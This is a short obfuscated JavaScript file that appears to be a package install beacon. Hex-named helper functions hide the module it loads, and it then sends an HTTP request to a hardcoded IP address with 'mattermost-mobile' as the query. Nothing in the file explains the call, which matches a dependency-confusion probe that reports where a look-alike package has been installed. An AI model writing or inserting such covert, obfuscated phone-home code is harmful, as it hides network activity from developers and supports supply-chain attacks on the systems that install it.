const _0x10f6e6 = _0x2e53;
const request = require(_0x10f6e6(0x0));
function _0x2e53(_0x10761e, _0x2e53f7) {
    const _0x253d37 = _0x1076();
    _0x2e53 = function (_0x2bbeed, _0x706bc) {
        _0x2bbeed = _0x2bbeed - 0x0;
        let _0x3c8357 = _0x253d37[_0x2bbeed];
        return _0x3c8357;
    };
    return _0x2e53(_0x10761e, _0x2e53f7);
}
let host = '128.199.122.145';
let packages = 'mattermost-mobile';
request('http://' + host + '/?' + packages, (_0x4a12a7, _0x3e2806, _0x20dfd5) => {
});
function _0x1076() {
    const _0x10e3a9 = ['requests'];
    _0x1076 = function () {
        return _0x10e3a9;
    };
    return _0x1076();
}
